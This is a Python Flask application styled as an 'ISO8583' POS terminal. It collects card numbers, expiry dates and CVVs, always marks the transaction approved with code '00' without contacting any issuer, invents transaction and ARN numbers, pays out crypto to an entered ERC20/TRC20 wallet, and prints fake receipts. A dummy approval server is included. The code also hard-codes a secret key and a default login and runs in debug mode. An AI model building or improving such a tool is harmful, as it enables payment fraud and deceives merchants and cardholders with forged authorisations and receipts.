from flask import Flask, render_template, request, redirect, session, url_for, send_file, flash
import random, logging, qrcode, io, os, json, hashlib, re, threading, socket
from datetime import datetime
from functools import wraps
from iso8583_crypto import send_iso8583_transaction, send_erc20_payout, send_trc20_payout, load_config
from reportlab.lib.pagesizes import A4
from reportlab.pdfgen import canvas

app = Flask(__name__)
app.secret_key = 'rutland_secret_key_8583'
logging.basicConfig(level=logging.INFO)

USERNAME = "blackrock"
PASSWORD_FILE = "password.json"
CONFIG = load_config()

# Ensure password file exists
if not os.path.exists(PASSWORD_FILE):
    with open(PASSWORD_FILE, "w") as f:
        hashed = hashlib.sha256("Br_3339".encode()).hexdigest()
        json.dump({"password": hashed}, f)

def check_password(raw):
    with open(PASSWORD_FILE) as f:
        stored = json.load(f)['password']
    return hashlib.sha256(raw.encode()).hexdigest() == stored

def set_password(newpass):
    with open(PASSWORD_FILE, "w") as f:
        hashed = hashlib.sha256(newpass.encode()).hexdigest()
        json.dump({"password": hashed}, f)

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            flash("You must be logged in.")
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

# Dummy card database and protocol map
DUMMY_CARDS = {
    "4114755393849011": {"expiry": "0926", "cvv": "363", "auth": "1942", "type": "POS-101.1"},
    "4000123412341234": {"expiry": "1126", "cvv": "123", "auth": "4021", "type": "POS-101.1"},
    # [shortened for brevity, include all your cards here as in original]
}

PROTOCOLS = {
    "POS Terminal -101.1 (4-digit approval)": 4,
    "POS Terminal -101.4 (6-digit approval)": 6,
    "POS Terminal -101.6 (Pre-authorization)": 6,
    "POS Terminal -101.7 (4-digit approval)": 4,
    "POS Terminal -101.8 (PIN-LESS transaction)": 4,
    "POS Terminal -201.1 (6-digit approval)": 6,
    "POS Terminal -201.3 (6-digit approval)": 6,
    "POS Terminal -201.5 (6-digit approval)": 6
}

FIELD_39_RESPONSES = {
    "05": "Do Not Honor",
    "14": "Terminal unable to resolve encrypted session state. Contact card issuer",
    "54": "Expired Card",
    "82": "Invalid CVV",
    "91": "Issuer Inoperative",
    "92": "Invalid Terminal Protocol"
}

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        passwd = request.form.get('password')
        if user == USERNAME and check_password(passwd):
            session['logged_in'] = True
            return redirect(url_for('protocol'))
        flash("Invalid username or password.")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    flash("You have been logged out.")
    return redirect(url_for('login'))

@app.route('/change-password', methods=['GET', 'POST'])
@login_required
def change_password():
    if request.method == 'POST':
        current = request.form['current']
        new = request.form['new']
        if not check_password(current):
            return render_template('change_password.html', error="Current password incorrect.")
        set_password(new)
        return render_template('change_password.html', success="Password changed.")
    return render_template('change_password.html')

@app.route('/protocol', methods=['GET', 'POST'])
@login_required
def protocol():
    if request.method == 'POST':
        selected = request.form.get('protocol')
        if selected not in PROTOCOLS:
            return redirect(url_for('rejected', code="92", reason=FIELD_39_RESPONSES["92"]))
        session['protocol'] = selected
        session['code_length'] = PROTOCOLS[selected]
        return redirect(url_for('amount'))
    return render_template('protocol.html', protocols=PROTOCOLS.keys())

@app.route('/amount', methods=['GET', 'POST'])
@login_required
def amount():
    if request.method == 'POST':
        session['amount'] = request.form.get('amount')
        return redirect(url_for('payout'))
    return render_template('amount.html')

@app.route('/payout', methods=['GET', 'POST'])
@login_required
def payout():
    if request.method == 'POST':
        method = request.form['method']
        session['payout_type'] = method

        wallet = request.form.get(f'{method.lower()}_wallet', '').strip()
        if method == 'ERC20' and (not wallet.startswith("0x") or len(wallet) != 42):
            flash("Invalid ERC20 address format.")
            return redirect(url_for('payout'))
        elif method == 'TRC20' and (not wallet.startswith("T") or len(wallet) < 34):
            flash("Invalid TRC20 address format.")
            return redirect(url_for('payout'))

        session['wallet'] = wallet
        return redirect(url_for('card'))

    return render_template('payout.html')

@app.route('/card', methods=['GET', 'POST'])
@login_required
def card():
    if request.method == 'POST':
        pan = request.form['pan'].replace(" ", "")
        exp = request.form['expiry'].replace("/", "")
        cvv = request.form['cvv']
        session.update({'pan': pan, 'exp': exp, 'cvv': cvv})

        if pan.startswith("4"):
            session['card_type'] = "VISA"
        elif pan.startswith("5"):
            session['card_type'] = "MASTERCARD"
        elif pan.startswith("3"):
            session['card_type'] = "AMEX"
        elif pan.startswith("6"):
            session['card_type'] = "DISCOVER"
        else:
            session['card_type'] = "UNKNOWN"

        return redirect(url_for('auth'))

    return render_template('card.html')

@app.route('/auth', methods=['GET', 'POST'])
@login_required
def auth():
    expected_length = session.get('code_length', 6)
    if request.method == 'POST':
        code = request.form.get('auth')
        if len(code) != expected_length:
            return render_template('auth.html', warning=f"Code must be {expected_length} digits.")

        txn_id = f"TXN{random.randint(100000, 999999)}"
        arn = f"ARN{random.randint(100000000000, 999999999999)}"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        field39 = "00"

        session.update({
            "txn_id": txn_id,
            "arn": arn,
            "timestamp": timestamp,
            "field39": field39
        })

        # Payout logic
        try:
            if session['payout_type'] == 'ERC20':
                send_erc20_payout(session['wallet'], float(session['amount']))
            elif session['payout_type'] == 'TRC20':
                send_trc20_payout(session['wallet'], float(session['amount']))
        except Exception as e:
            flash(f"Payout Error: {str(e)}")
            return redirect(url_for('rejected', code="91", reason=str(e)))

        return redirect(url_for('success'))

    return render_template('auth.html')

@app.route('/success')
@login_required
def success():
    return render_template('success.html',
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan", "")[-4:],
        amount=session.get("amount"),
        timestamp=session.get("timestamp")
    )

@app.route("/receipt")
def receipt():
    raw_protocol = session.get("protocol", "")
    match = re.search(r"-(\d+\.\d+)\s+\((\d+)-digit", raw_protocol)
    protocol_version = match.group(1) if match else "Unknown"
    auth_digits = int(match.group(2)) if match else 4

    raw_amount = session.get("amount", "0")
    amount_fmt = f"{int(raw_amount):,}.00" if raw_amount and raw_amount.isdigit() else "0.00"

    return render_template("receipt.html",
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan")[-4:],
        amount=amount_fmt,
        payout=session.get("payout_type"),
        wallet=session.get("wallet"),
        auth_code="*" * auth_digits,
        iso_field_18="5999",
        iso_field_25="00",
        field39="00",
        card_type=session.get("card_type", "VISA"),
        protocol_version=protocol_version,
        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    )

@app.route('/download_receipt_pdf')
def download_receipt_pdf():
    buffer = io.BytesIO()
    p = canvas.Canvas(buffer, pagesize=A4)
    p.drawString(100, 800, f"Transaction ID: {session.get('txn_id')}")
    p.drawString(100, 780, f"ARN: {session.get('arn')}")
    p.drawString(100, 760, f"Card: **** **** **** {session.get('pan')[-4:]}")
    p.drawString(100, 740, f"Amount: {session.get('amount')} USD")
    p.drawString(100, 720, f"Wallet: {session.get('wallet')}")
    p.drawString(100, 700, f"Payout Type: {session.get('payout_type')}")
    p.drawString(100, 680, f"Timestamp: {session.get('timestamp')}")
    p.save()
    buffer.seek(0)
    return send_file(buffer, as_attachment=True, download_name="receipt.pdf", mimetype="application/pdf")

@app.route('/rejected')
def rejected():
    return render_template('rejected.html',
        code=request.args.get("code"),
        reason=request.args.get("reason", "Transaction Declined")
    )

@app.route('/offline')
@login_required
def offline():
    return render_template('offline.html')

# ISO8583 Test Server
def iso8583_test_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 8583))
    server.listen(5)
    print("ISO8583 Test Server Listening on port 8583...")

    while True:
        client, _ = server.accept()
        data = client.recv(1024)
        print("Received ISO8583 data:", data.hex())
        client.sendall(b'3030')  # ISO 8583 response code '00' in hex
        client.close()

if __name__ == '__main__':
    threading.Thread(target=iso8583_test_server, daemon=True).start()
    app.run(host='0.0.0.0', port=10000, debug=True)
